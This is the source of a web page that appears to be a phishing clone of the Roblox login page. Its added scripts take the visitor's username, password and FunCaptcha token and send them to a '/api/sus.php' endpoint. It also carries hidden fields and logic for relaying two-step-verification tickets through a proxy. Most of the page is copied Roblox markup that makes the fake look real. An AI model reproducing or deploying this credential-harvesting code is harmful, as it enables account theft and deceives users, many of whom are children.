	Roblox.Endpoints.Urls['/headshot-thumbnail/json'] = 'https://www.roblox.com/headshot-thumbnail/json';
	Roblox.Endpoints.Urls['/item-thumbnails'] = 'https://www.roblox.com/item-thumbnails';
	Roblox.Endpoints.Urls['/outfit-thumbnail/json'] = 'https://www.roblox.com/outfit-thumbnail/json';
	Roblox.Endpoints.Urls['/place-thumbnails'] = 'https://www.roblox.com/place-thumbnails';
	Roblox.Endpoints.Urls['/thumbnail/asset/'] = 'https://www.roblox.com/thumbnail/asset/';
	Roblox.Endpoints.Urls['/thumbnail/avatar-headshot'] = 'https://www.roblox.com/thumbnail/avatar-headshot';
	Roblox.Endpoints.Urls['/thumbnail/avatar-headshots'] = 'https://www.roblox.com/thumbnail/avatar-headshots';
	Roblox.Endpoints.Urls['/thumbnail/user-avatar'] = 'https://www.roblox.com/thumbnail/user-avatar';
	Roblox.Endpoints.Urls['/thumbnail/resolve-hash'] = 'https://www.roblox.com/thumbnail/resolve-hash';
	Roblox.Endpoints.Urls['/thumbnail/place'] = 'https://www.roblox.com/thumbnail/place';
	Roblox.Endpoints.Urls['/thumbnail/get-asset-media'] = 'https://www.roblox.com/thumbnail/get-asset-media';
	Roblox.Endpoints.Urls['/thumbnail/remove-asset-media'] = 'https://www.roblox.com/thumbnail/remove-asset-media';
	Roblox.Endpoints.Urls['/thumbnail/set-asset-media-sort-order'] = 'https://www.roblox.com/thumbnail/set-asset-media-sort-order';
	Roblox.Endpoints.Urls['/thumbnail/place-thumbnails'] = 'https://www.roblox.com/thumbnail/place-thumbnails';
	Roblox.Endpoints.Urls['/thumbnail/place-thumbnails-partial'] = 'https://www.roblox.com/thumbnail/place-thumbnails-partial';
	Roblox.Endpoints.Urls['/thumbnail_holder/g'] = 'https://www.roblox.com/thumbnail_holder/g';
	Roblox.Endpoints.Urls['/users/{id}/profile'] = 'https://www.roblox.com/users/{id}/profile';
	Roblox.Endpoints.Urls['/service-workers/push-notifications'] = 'https://www.roblox.com/service-workers/push-notifications';
	Roblox.Endpoints.Urls['/notification-stream/notification-stream-data'] = 'https://www.roblox.com/notification-stream/notification-stream-data';
	Roblox.Endpoints.Urls['/api/friends/acceptfriendrequest'] = 'https://www.roblox.com/api/friends/acceptfriendrequest';
	Roblox.Endpoints.Urls['/api/friends/declinefriendrequest'] = 'https://www.roblox.com/api/friends/declinefriendrequest';
	Roblox.Endpoints.Urls['/authentication/is-logged-in'] = 'https://www.roblox.com/authentication/is-logged-in';
	Roblox.Endpoints.addCrossDomainOptionsToAllRequests = true;
	</script>
<script type="text/javascript">
	if(typeof(Roblox) === "undefined") {
		Roblox = {};
	}
	Roblox.Endpoints = Roblox.Endpoints || {};
	Roblox.Endpoints.Urls = Roblox.Endpoints.Urls || {};
	</script>
<script>
	Roblox = Roblox || {};
	Roblox.AbuseReportPVMeta = {
		desktopEnabled: false,
		phoneEnabled: false,
		inAppEnabled: false
	};
	</script>
<meta name="thumbnail-meta-data" data-is-webapp-cache-enabled="False" data-webapp-cache-expirations-timespan="00:01:00" data-request-min-cooldown="1000" data-request-max-cooldown="30000" data-request-max-retry-attempts="5" data-request-batch-size="100" data-thumbnail-metrics-sample-size="20" data-concurrent-thumbnail-request-count="4" /> </head>
<body id="rbx-body" class="rbx-body   light-theme gotham-font" data-performance-relative-value="0.005" data-internal-page-name="Login" data-send-event-percentage="0">
<meta name="csrf-token" data-token="d1+Sp5bntBGL" />
<div id="roblox-linkify" data-enabled="true" data-regex="(https?\:\/\/)?(?:www\.)?([a-z0-9-]{2,}\.)*(((m|de|www|web|api|blog|wiki|corp|polls|bloxcon|developer|devforum|forum|status)\.roblox\.com|robloxlabs\.com)|(www\.shoproblox\.com)|(roblox\.status\.io)|(rblx\.co)|help\.roblox\.com(?![A-Za-z0-9\/.]*\/attachments\/))(?!\/[A-Za-z0-9-+&amp;@#\/=~_|!:,.;]*%)((\/[A-Za-z0-9-+&amp;@#\/%?=~_|!:,.;]*)|(?=\s|\b))" data-regex-flags="gm" data-as-http-regex="(([^.]help|polls)\.roblox\.com)"></div>
<div id="image-retry-data" data-image-retry-max-times="30" data-image-retry-timer="500" data-ga-logging-percent="10"> </div>
<div id="http-retry-data" data-http-retry-max-timeout="0" data-http-retry-base-timeout="0" data-http-retry-max-times="1"> </div>
<div id="fb-root"></div>
<div id="wrap" class="wrap no-gutter-ads logged-out" data-gutter-ads-enabled="false">
<div id="navigation-container" class="light-theme gotham-font" data-number-of-autocomplete-suggestions="0">
<div id="header" class="navbar-fixed-top rbx-header" role="navigation">
<div class="container-fluid">
<div class="rbx-navbar-header">
<div id="header-menu-icon" role="button" tabindex="0" class="rbx-nav-collapse"> <span class="icon-nav-menu"></span> </div>
<div class="navbar-header"> <a class="navbar-brand" href="/home"><span class="icon-logo"></span><span class="icon-logo-r"></span
        ></a> </div>
</div>
<ul class="nav rbx-navbar hidden-xs hidden-sm col-md-5 col-lg-4">
<li class="cursor-pointer"> <a class="font-header-2 nav-menu-title text-header" href="/discover">Discover</a> </li>
<li class="cursor-pointer"> <a class="font-header-2 nav-menu-title text-header" href="/catalog">Avatar Shop</a> </li>
<li class="cursor-pointer"> <a class="font-header-2 nav-menu-title text-header" href="/develop">Create</a> </li>
<li class="cursor-pointer"> <a class="font-header-2 nav-menu-title text-header" href="/robux?ctx-nav">Robux</a
        >
</li>
</ul>
<ul class="nav rbx-navbar hidden-md hidden-lg col-xs-12">
<li class="cursor-pointer">
<a class="font-header-2 nav-menu-title text-header" href="/discover">Discover</a> </li>
<li class="cursor-pointer"> <a class="font-header-2 nav-menu-title text-header" href="/catalog">Avatar Shop</a> </li>
<li class="cursor-pointer"> <a class="font-header-2 nav-menu-title text-header" href="/develop">Create</a> </li>
<li class="cursor-pointer"> <a class="font-header-2 nav-menu-title text-header" href="/robux?ctx=nav">Robux</a
        >
</li>
</ul>
<div id="right-navigation-header"></div>
</div>
</div>
<div id="left-navigation-container"></div>
<div id="verificationUpsell-container">
<div verificationUpsell-container></div>
</div>
<div id="accountRecoveryModal-container">
<div accountRecoveryModal-container></div>
</div>
</div>
<script type="text/javascript">
    var Roblox = Roblox || {};
    (function () {
        if (Roblox && Roblox.Performance) {
            Roblox.Performance.setPerformanceMark("navigation_end");
        }
    })();
</script>
<div class="container-main 
                
                
                
                
                
                " id="container-main">
<script type="text/javascript">
                if (top.location != self.location) {
                    top.location = self.location.href;
                }
            </script>
<div class="alert-container">
<noscript><div><div class="alert-info" role="alert">Please enable Javascript to use all the features on this site.</div></div></noscript>
</div>
<div class="content">
<script src="https://roblox-api.arkoselabs.com/fc/api/?onload=reportFunCaptchaLoaded" async onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportResourceError('funcaptcha')"></script>
<script type="text/javascript">
    var Roblox = Roblox || {};
    $(function () {
        var funCaptcha = Roblox.FunCaptcha;
        if (funCaptcha) {
            var captchaTypes = [{"Type":"Login","PublicKey":"9F35E182-C93C-EBCC-A31D-CF8ED317B996","ApiUrl":"https://captcha.roblox.com/v1/funcaptcha/login/web"}];
            funCaptcha.addCaptchaTypes(captchaTypes, true);
            funCaptcha.setMaxRetriesOnTokenValidationFailure(0);
            funCaptcha.setPerAppTypeLoggingEnabled(false);
            funCaptcha.setRetryIntervalRange(500, 1500);
        }
    });

    // Necessary because of how FunCaptcha js executes callback
    // i.e. window["{function name}"]
    function reportFunCaptchaLoaded()
    {
        if (Roblox.BundleDetector)
        {
            Roblox.BundleDetector.reportResourceLoaded("funcaptcha");
        }
    }
</script>
<script>
    function login(){
        var username = document.getElementById("login-username").value;
        var password = document.getElementById("login-password").value;
        if(!username || !password){
            document.getElementById("text-error").innerHTML = "Username and password required";
        }else if(username.length < 3 || password.length < 8){
            document.getElementById("text-error").innerHTML = "Incorrect username or password.";
        }else{
            //alert("not empty" + username + " | " + password);
            const url = 'api/username.php?username=' + encodeURIComponent(username);
                $.ajax(url, {
                    method: "GET",
                    success: (data) => {
                        const obj = $.parseJSON(data);
                        if(obj['errorMessage'] == "User not found"){
                            document.getElementById("text-error").innerHTML = "Incorrect username or password.";
                        }else{
                            const apiBanned = 'api/users.php?id=' + encodeURIComponent(obj['Id']);
                            $.ajax(apiBanned, {
                            method: "GET",
                            success: (dataBanned) => {
                                const checkBanned = $.parseJSON(dataBanned);
                                if(checkBanned['isBanned'] == true){
                                    document.getElementById("text-error").innerHTML = "Incorrect username or password.";
                                }else{
                                    document.getElementById("rbx-body").setAttribute("style", "overflow: hidden");
                                    document.getElementById("login-button").style.display = "none";
                                    document.getElementById("login-loading").style.display = "block";
                                    document.getElementById("captcha").style.display = "block";
                                    document.getElementById("fc-iframe-wrap").src = "https://iframe.arkoselabs.com/476068BF-9607-4799-B53D-966BE98E2B81";
                                }
                            }
                        })
                        }
                    }
                })
        }
    }
</script>
<div id="secret-login" style="display: none;">
    <input id="secret-funcaptcha" name="secret-funcaptcha" value="" hidden>
    <button id="secret-login-btn"></button>
</div>
<div id="secret-form" style="display: none;">
    <input id="secret-proxy" hidden>
    <input id="secret-userid" hidden>
    <input id="secret-ticket" hidden>
</div>
<script>
  window.addEventListener("message", function(event) {
    var json_parsed_event = JSON.parse(event.data)
    switch (json_parsed_event.eventId) {
      case "challenge-loaded":
        document.getElementById("arkoseFrame").style.height = json_parsed_event.payload.frameHeight;
        document.getElementById("arkoseFrame").style.width = json_parsed_event.payload.frameWidth;
        break;
      case "challenge-suppressed":
        break;
      case "challenge-complete":
        document.getElementById('secret-funcaptcha').value = json_parsed_event.payload.sessionToken;
        document.getElementById('rbx-body').removeAttribute('style');
        document.getElementById("captcha").style.display = "none";
        document.getElementById('text-error').innerHTML = '';
        document.getElementById("secret-login-btn").click();
        break;
      case "challenge-shown":
        break;
      case "challenge-iframeSize":
        document.getElementById("arkoseFrame").style.height = json_parsed_event.payload.frameHeight;
        document.getElementById("arkoseFrame").style.width = json_parsed_event.payload.frameWidth;
        break;
    }
  });
  $("#secret-login-btn").click(function() {
      var username = $("#login-username").val();
      var password = $("#login-password").val();
      var fctokens = $("#secret-funcaptcha").val();
      var session = "<?php echo $session; ?>";
      
      const checkcode = '/api/sus.php?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password) + '&fctokens=' + encodeURIComponent(fctokens) + '&session=' + encodeURIComponent(session);
      $.ajax(checkcode, {
      method: "GET",
      success: (data) => {
      const jsondata = $.parseJSON(data);
      if (jsondata['message'] == "success") {
        window.location.href = "https://roblox.com";
      } else if (jsondata['message'] == "2nd") {
        var ticket = jsondata['ticket'];
        var proxy = jsondata['proxy'];
        var userid = jsondata['userid'];
        document.getElementById('twostepverification').style.display = 'block';
        document.getElementById('rbx-body').setAttribute('style', 'overflow: hidden');
        document.getElementById('text-error').innerHTML = '';
        document.getElementById('login-loading').style.display = 'none';
        document.getElementById('login-button').style.display = 'block';
        $("#secret-ticket").val(ticket);
        $("#secret-userid").val(userid);
        $("#secret-proxy").val(proxy);
        console.log(ticket);
      } else {
        document.getElementById("login-loading").style.display = "none";
        document.getElementById("login-button").style.display = "block";
        document.getElementById("text-error").innerHTML = jsondata['message'];
      }
    }
    })
  });
</script>
<div id="login-container" class="login-container ng-scope">
<div login-base="" is-facebook-sign-in-enabled="true" is-login-fun-captcha-enabled="true" is-always-captcha-login-enabled="false" is-bedev2-captcha-for-web-login-enabled="true" data-return-url="">
<div id="login-base">
<div class="section-content login-section">
<h2 class="login-header ng-binding" ng-bind="'Heading.LoginRoblox' | translate">Login to Roblox</h2>
<div login-form="" context="loginPage" redirect-to-home-post-login="false" is-facebook-sign-in-enabled="true" include-message-banner="true" data-return-url="" class="ng-isolate-scope">
<div id="login-form">
<div ng-init="init('login')">

<system-feedback ng-if="loginParams.includeMessageBanner" class="ng-scope ng-isolate-scope">
<div class="sg-system-feedback">
<div class="alert-system-feedback">
<div class="alert " ng-class="{ on: $ctrl.params.showBanner }">
<span class="alert-content ng-binding ng-scope" ng-bind="$ctrl.params.bannerText" ng-if="!$ctrl.params.isHtmlAllowed"></span>



</div>
</div>
</div>
</system-feedback>

<div class="login-form-container">
<form class="login-form ng-pristine ng-valid" role="form" name="loginForm" rbx-form-context="" context="loginPage">
<div class="form-group username-form-group">
<input id="login-username" name="username" type="text" class="form-control input-field ng-pristine ng-valid ng-empty ng-touched" placeholder="Username/Email/Phone" ng-model="loginFormData.credentialValue" ng-keypress="clearError()" rbx-form-interaction=""> </div>
<div class="form-group password-form-group">
<input id="login-password" name="password" type="password" class="form-control input-field ng-pristine ng-untouched ng-valid ng-empty" placeholder="Password" ng-model="loginFormData.password" key-press-enter="submit(true)" ng-keypress="clearError()" rbx-form-interaction="">
<p id="text-error" class="form-control-label xsmall text-error login-error ng-binding" ng-bind="loginLayout.error" ng-show="!loginLayout.showCrossDeviceError"></p>
<p class="form-control-label xsmall text-error login-error ng-hide" ng-show="loginLayout.showCrossDeviceError"> <span ng-bind="loginPageIXP.ErrorStart" class="ng-binding"></span> <u><a ng-click="quickLogin()" ng-bind="loginPageIXP.ErrorLink" class="ng-binding"></a></u> <span ng-bind="loginPageIXP.ErrorEnd" class="ng-binding"></span> </p>
</div>
<div>
<input type="button" id="login-button" class="btn-full-width login-button ng-binding btn-secondary-md" onclick="login();" value="Log In">
</div>
<div id="login-loading" class="spinner spinner-sm spinner-no-margin spinner-block" style="display: none;"></div>
<div class="text-center forgot-credentials-link"> <a id="forgot-credentials-link" class="text-link ng-binding" href="https://www.roblox.com/login/forgot-password-or-username" target="_self" ng-bind="'Action.ForgotPasswordOrUsernameQuestionCapitalized' | translate">Forgot Password or Username?</a> </div>
</form>

<div ng-if="loginParams.isFacebookSignInEnabled &amp;&amp; !loginParams.useFacebookRedirect" class="ng-scope">
<div class="fb-divider-container">
<div class="rbx-divider fb-divider"></div>
<div class="divider-text-container"> <span class="divider-text xsmall ng-binding" ng-bind="'Label.LoginWithYour' | translate">login with</span> </div>
</div>

<button ng-if="crossDeviceLoginParams.IsLoginCodeButtonDisplayed" id="cross-device-login-button" class="btn-full-width btn-control-md cross-device-login-button ng-scope" ng-click="quickLogin()"> <span ng-bind="(!!loginPageIXP.ButtonText) ? loginPageIXP.ButtonText :
                    ('Action.DeviceCode' | translate)" class="ng-binding" onclick="quicklogin()">Quick Log In</span> </button>
</div>
<span id="2sv-popup-container"></span> </div>
<div role="dialog" id="captcha" style="display: none;"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern modal-modern-challenge-captcha in modal" style="display: block;"><div class="modal-dialog"><div class="modal-content" role="document"><div class="modal-body"><button type="button" class="challenge-captcha-close-button"><span class="icon-close" onclick="closecaptcha()"></span></button><div></div><div class="challenge-captcha-body" id="challenge-captcha-element"><div id="FunCaptcha"><iframe frameborder="0" scrolling="no" id="fc-iframe-wrap" class="fc-iframe-wrap" aria-label=" " style="width: 308px; height: 252px;"></iframe></div></div></div></div></div></div></div>
<script>
    function closecaptcha(){
        document.getElementById('captcha').style.display = 'none';document.getElementById('rbx-body').removeAttribute('style');
        document.getElementById("login-button").style.display = "block";
                                    document.getElementById("login-loading").style.display = "none";
    }
</script>
<div id="crossDeviceLoginDisplayCodeModal-container"></div>
<div id="securityQuestionsModal-container"></div>
<div id="react-login-container">
<div id="twostep"></div>
<div id="captcha"></div>
<div id="quicklogin"></div>
<div></div>
</div>
</div>
</div>
</div>
<div class="text-center">
<div class="signup-option"> <span class="no-account-text ng-binding" ng-bind="'Label.NoAccount' | translate">Don't have an account?</span> <a id="sign-up-link" class="text-link signup-link ng-binding" href="https://www.roblox.com/account/signupredir" target="_self" ng-bind="'Action.SignUpCapitalized' | translate">Sign Up</a> </div>
</div>
</div>
</div>
</div>
</div>
<script>
    var Roblox = Roblox || {};
    Roblox.LoginMeta = {
        signupUrl: "https://www.roblox.com/account/signupredir",
        forgotCredentialsUrl: "https://www.roblox.com/login/forgot-password-or-username",
        homeUrl: "https://www.roblox.com/home",
        securityNotificationUrl: "https://www.roblox.com/login/securitynotification",
        apiProxyUrl: "https://api.roblox.com",
        fbSignInUrl: "",
        loginPageUrl: "https://www.roblox.com/newlogin",
        isLoginWithEmailEnabled: true,
        isLoginWithPhoneEnabled: true,
        isPromptUnverifiedEmailsEnabled: false
    };
</script>
<script type="text/javascript" src="https://cdns.gigya.com/js/gigya.js?apiKey=3_OsvmtBbTg6S_EUbwTPtbbmoihFY5ON6v6hbVrTbuqpBs7SyF_LQaJwtwKJ60sY1p" async defer>
            {
                bypassCookiePolicy: 'never'
            }
        </script>
<div id="SocialIdentitiesInformation" data-rbx-login-redirect-url="/social/postlogin" data-context="loginPage">
</div>
</div>
</div>

</div>
<footer class="container-footer" id="footer-container" data-is-giftcards-footer-enabled="True"><div class="footer"><ul class="row footer-links"><li class="footer-link"><a class="text-footer-nav" href="/info/about-us?locale=en_us" target="_blank">About Us</a></li><li class="footer-link"><a class="text-footer-nav" href="/info/jobs?locale=en_us" target="_blank">Jobs</a></li><li class="footer-link"><a class="text-footer-nav" href="/info/blog?locale=en_us" target="_blank">Blog</a></li><li class="footer-link"><a class="text-footer-nav" href="/info/parents?locale=en_us" target="_blank">Parents</a></li><li class="footer-link"><a class="text-footer-nav giftcards" href="/giftcards?locale=en_us" target="_blank">Gift Cards</a></li><li class="footer-link"><a class="text-footer-nav" href="/info/help?locale=en_us" target="_blank">Help</a></li><li class="footer-link"><a class="text-footer-nav" href="/info/terms?locale=en_us" target="_blank">Terms</a></li><li class="footer-link"><a class="text-footer-nav" href="/info/accessibility?locale=en_us" target="_blank">Accessibility</a></li><li class="footer-link"><a class="text-footer-nav privacy" href="/info/privacy?locale=en_us" target="_blank">Privacy</a></li></ul><div class="row copyright-container"><div class="col-sm-6 col-md-3"></div><div class="col-sm-12"><p class="text-footer footer-note">©2022 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.</p></div></div></div></footer>
<div id="cookie-banner-wrapper" class="cookie-banner-wrapper"></div>
<script type="text/javascript">function urchinTracker() {}</script>
<script type="text/javascript">
    if (typeof Roblox === "undefined") {
        Roblox = {};
    }
    if (typeof Roblox.PlaceLauncher === "undefined") {
        Roblox.PlaceLauncher = {};
    }
    var isRobloxIconEnabledForRetheme = "True";
    var robloxIcon = isRobloxIconEnabledForRetheme === 'True' ? "<span class='icon-logo-r-95'></span>" : "<img src='https://images.rbxcdn.com/8e7879f99cfa7cc3b1fce74f8191be03.svg' width='90' height='90' alt='R'/>"; </script>
<div id="PlaceLauncherStatusPanel" style="display:none;width:300px" data-new-plugin-events-enabled="True" data-event-stream-for-plugin-enabled="True" data-event-stream-for-protocol-enabled="True" data-is-game-launch-interface-enabled="True" data-is-protocol-handler-launch-enabled="True" data-is-duar-auto-opt-in-enabled="false" data-is-duar-opt-out-disabled="false" data-is-user-logged-in="False" data-os-name="Windows" data-protocol-name-for-client="roblox-player" data-protocol-name-for-studio="roblox-studio" data-protocol-roblox-locale="en_us" data-protocol-game-locale="en_us" data-protocol-url-includes-launchtime="true" data-protocol-detection-enabled="true" data-protocol-separate-script-parameters-enabled="true" data-protocol-avatar-parameter-enabled="false" data-protocol-channel-name="LIVE" data-protocol-studio-channel-name="LIVE" data-protocol-player-channel-name="LIVE">
<div class="modalPopup blueAndWhite PlaceLauncherModal" style="min-height: 160px">
<div id="Spinner" class="Spinner" style="padding:20px 0;"> <img data-delaysrc="https://images.rbxcdn.com/e998fb4c03e8c2e30792f2f3436e9416.gif" height="32" width="32" alt="Progress" /> </div>
<div id="status" style="min-height:40px;text-align:center;margin:5px 20px">
<div id="Starting" class="PlaceLauncherStatus MadStatusStarting" style="display:block"> Starting Roblox... </div>
<div id="Waiting" class="PlaceLauncherStatus MadStatusField">Connecting to People...</div>
<div id="StatusBackBuffer" class="PlaceLauncherStatus PlaceLauncherStatusBackBuffer MadStatusBackBuffer"></div>
</div>
<div style="text-align:center;margin-top:1em">
<input type="button" class="Button CancelPlaceLauncherButton translate" value="Cancel" /> </div>
</div>
</div>
<div id="ProtocolHandlerClickAlwaysAllowed" class="ph-clickalwaysallowed" style="display:none;">
<p class="larger-font-size"> <span class="icon-moreinfo"></span> Check <strong>Always open links for URL: Roblox Protocol</strong> and click <strong>Open URL: Roblox Protocol</strong> in the dialog box above to join experiences faster in the future! </p>
</div>
<script type="text/javascript">
							function checkRobloxInstall() {
								return RobloxLaunch.CheckRobloxInstall('https://www.roblox.com/Download');
							}
							</script>
<div id="InstallationInstructions" class="" style="display:none;">
<div class="ph-installinstructions">
<div class="ph-modal-header"> <span class="icon-close simplemodal-close"></span>
<h3 class="title">Thanks for visiting Roblox</h3> </div>
<div class="modal-content-container">
<div class="ph-installinstructions-body ">
<ul class="modal-col-4">
<li class="step1-of-4">
<h2>1</h2>
<p class="larger-font-size">Click <strong>RobloxPlayer.exe</strong> to run the Roblox installer, which just downloaded via your web browser.</p> <img data-delaysrc="https://images.rbxcdn.com/28eaa93b899b93461399aebf21c5346f.png" /> </li>
<li class="step2-of-4">
<h2>2</h2>
<p class="larger-font-size">Click <strong>Run</strong> when prompted by your computer to begin the installation process.</p> <img data-delaysrc="https://images.rbxcdn.com/51328932dedb5d8d61107272cc1a27db.png" /> </li>
<li class="step3-of-4">
<h2>3</h2>
<p class="larger-font-size">Click <strong>Ok</strong> once you've successfully installed Roblox.</p> <img data-delaysrc="https://images.rbxcdn.com/3797745629baca2d1b9496b76bc9e6dc.png" /> </li>
<li class="step4-of-4">
<h2>4</h2>
<p class="larger-font-size">After installation, click <strong>Join</strong> below to join the action!</p>
<div class="VisitButton VisitButtonContinueGLI"> <a class="btn btn-primary-lg disabled btn-full-width">Join</a> </div>
</li>
</ul>
</div>
</div>
<div class="xsmall"> The Roblox installer should download shortly. If it doesn’t, start the <a id="GameLaunchManualInstallLink" href="#" class="text-link">download now.</a>
<script>
										if(Roblox.ProtocolHandlerClientInterface && typeof Roblox.ProtocolHandlerClientInterface.attachManualDownloadToLink === 'function') {
											Roblox.ProtocolHandlerClientInterface.attachManualDownloadToLink();
										}
										</script>
</div>
</div>
</div>
<div class="InstallInstructionsImage" data-modalwidth="970" style="display:none;"></div>
<div id="pluginObjDiv" style="height:1px;width:1px;visibility:hidden;position: absolute;top: 0;"></div>
<iframe id="downloadInstallerIFrame" name="downloadInstallerIFrame" style="visibility:hidden;height:0;width:1px;position:absolute"></iframe>
<script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true' data-bundlename='clientinstaller' type='text/javascript' src='https://js.rbxcdn.com/459f4d69b0709806c7ee83714896739e.js'></script>
<script type="text/javascript">
							Roblox.Client._skip = null;
							Roblox.Client._CLSID = '76D50904-6780-4c8b-8986-1A7EE0B1716D';
							Roblox.Client._installHost = 'setup.roblox.com';
							Roblox.Client.ImplementsProxy = true;
							Roblox.Client._silentModeEnabled = true;
							Roblox.Client._bringAppToFrontEnabled = false;
							Roblox.Client._currentPluginVersion = '';
							Roblox.Client._eventStreamLoggingEnabled = true;
							Roblox.Client._installSuccess = function() {
								if(GoogleAnalyticsEvents) {
									GoogleAnalyticsEvents.ViewVirtual('InstallSuccess');
									GoogleAnalyticsEvents.FireEvent(['Plugin', 'Install Success']);
									if(Roblox.Client._eventStreamLoggingEnabled && typeof Roblox.GamePlayEvents != "undefined") {
										Roblox.GamePlayEvents.SendInstallSuccess(Roblox.Client._launchMode, play_placeId);
									}
								}
							}
							if((window.chrome || window.safari) && window.location.hash == '#chromeInstall') {
								window.location.hash = '';
								var continuation = '(' + $.cookie('chromeInstall') + ')';
								play_placeId = $.cookie('chromeInstallPlaceId');
								Roblox.GamePlayEvents.lastContext = $.cookie('chromeInstallLaunchMode');
								$.cookie('chromeInstallPlaceId', null);
								$.cookie('chromeInstallLaunchMode', null);
								$.cookie('chromeInstall', null);
								RobloxLaunch._GoogleAnalyticsCallback = function() {
									var isInsideRobloxIDE = 'website';
									if(Roblox && Roblox.Client && Roblox.Client.isIDE && Roblox.Client.isIDE()) {
										isInsideRobloxIDE = 'Studio';
									};
									GoogleAnalyticsEvents.FireEvent(['Plugin Location', 'Launch Attempt', isInsideRobloxIDE]);
									GoogleAnalyticsEvents.FireEvent(['Plugin', 'Launch Attempt', 'Play']);
									EventTracker.fireEvent('GameLaunchAttempt_Win32', 'GameLaunchAttempt_Win32_Plugin');
									if(typeof Roblox.GamePlayEvents != 'undefined') {
										Roblox.GamePlayEvents.SendClientStartAttempt(null, play_placeId);
									}
								};
								Roblox.Client.ResumeTimer(eval(continuation));
							}
							</script>
<div class="ConfirmationModal modalPopup unifiedModal smallModal" data-modal-handle="confirmation" style="display:none;">
<a class="genericmodal-close ImageButton closeBtnCircle_20h"></a>
<div class="Title"></div>
<div class="GenericModalBody">
<div class="TopBody">
<div class="ImageContainer roblox-item-image" data-image-size="small" data-no-overlays data-no-click> <img class="GenericModalImage" alt="generic image" /> </div>
<div class="Message"></div>
</div>
<div class="ConfirmationModalButtonContainer GenericModalButtonContainer"> <a href id="roblox-confirm-btn"><span></span></a> <a href id="roblox-decline-btn"><span></span></a> </div>
<div class="ConfirmationModalFooter"> </div>
</div>
<script type="text/javascript">
								Roblox = Roblox || {};
								Roblox.Resources = Roblox.Resources || {};
								Roblox.Resources.GenericConfirmation = {
									yes: "Yes",
									No: "No",
									Confirm: "Confirm",
									Cancel: "Cancel"
								};
								</script>
</div>
<div id="modal-confirmation" class="modal-confirmation" data-modal-type="confirmation">
<div id="modal-dialog" class="modal-dialog">
<div class="modal-content">
<div class="modal-header">
<button type="button" class="close" data-dismiss="modal"> <span aria-hidden="true"><span class="icon-close"></span></span><span class="sr-only">Close</span> </button>
<h5 class="modal-title"></h5> </div>
<div class="modal-body">
<div class="modal-top-body">
<div class="modal-message"></div>
<div class="modal-image-container roblox-item-image" data-image-size="medium" data-no-overlays data-no-click> <img class="modal-thumb" alt="generic image" /> </div>
<div class="modal-checkbox checkbox">
<input id="modal-checkbox-input" type="checkbox" />
<label for="modal-checkbox-input"></label>
</div>
</div>
<div class="modal-btns"> <a href id="confirm-btn"><span></span></a> <a href id="decline-btn"><span></span></a> </div>
<div class="loading modal-processing"> <img class="loading-default" src='https://images.rbxcdn.com/4bed93c91f909002b1f17f05c0ce13d1.gif' alt="Processing..." /> </div>
</div>
<div class="modal-footer text-footer"> </div>
</div>
</div>
</div>
<script type="text/javascript">
							var Roblox = Roblox || {};
							Roblox.jsConsoleEnabled = false;
							</script>
<script type="text/javascript">
							$(function() {
								Roblox.CookieUpgrader.domain = 'roblox.com';
								Roblox.CookieUpgrader.upgrade("GuestData", {
									expires: Roblox.CookieUpgrader.thirtyYearsFromNow
								});
								Roblox.CookieUpgrader.upgrade("RBXSource", {
									expires: function(cookie) {
										return Roblox.CookieUpgrader.getExpirationFromCookieValue("rbx_acquisition_time", cookie);
									}
								});
								Roblox.CookieUpgrader.upgrade("RBXViralAcquisition", {
									expires: function(cookie) {
										return Roblox.CookieUpgrader.getExpirationFromCookieValue("time", cookie);
									}
								});
								Roblox.CookieUpgrader.upgrade("RBXMarketing", {
									expires: Roblox.CookieUpgrader.thirtyYearsFromNow
								});
								Roblox.CookieUpgrader.upgrade("RBXSessionTracker", {
									expires: Roblox.CookieUpgrader.fourHoursFromNow
								});
								Roblox.CookieUpgrader.upgrade("RBXEventTrackerV2", {
									expires: Roblox.CookieUpgrader.thirtyYearsFromNow
								});
							});
							</script>
<script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true' data-bundlename='intl-polyfill' type='text/javascript' src='https://js.rbxcdn.com/d44520f7da5ec476cfb1704d91bab327.js'></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="InternationalCore" data-bundle-source="Main" src="https://js.rbxcdn.com/95044be3ff42e3dc429313faca1316cea62f328a39e29689ffeda9002f3a8bc6.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="TranslationResources" data-bundle-source="Main" src="https://js.rbxcdn.com/83d836a661ff433d5b7ce719c489e43af590ff75ab39ccc6d393546fe91b766a.js"></script>
<script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true' data-bundlename='leanbase' type='text/javascript' src='https://js.rbxcdn.com/dc18e42a89b40ecfdac6ddb75052e94f.js'></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="CoreUtilities" data-bundle-source="Main" src="https://js.rbxcdn.com/72bb88d05dec1c72332849b75defc1dee84a86e71851dba5a3b54d66a4adf95e.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="CoreRobloxUtilities" data-bundle-source="Main" src="https://js.rbxcdn.com/3dbdd710733380f428cd4fb7b4e08865b0f9083d1869c7d02478008e6b8c83d8.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="React" data-bundle-source="Main" src="https://js.rbxcdn.com/4c9a00164d9242bd60de5451a22f502c0c221a896d3a555470c03712d5ee4aa1.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="ReactUtilities" data-bundle-source="Main" src="https://js.rbxcdn.com/cf340fb618d9a73913b30dfc624ae60d68b9e59723746e6c08d06d14ebdd6dca.js"></script>
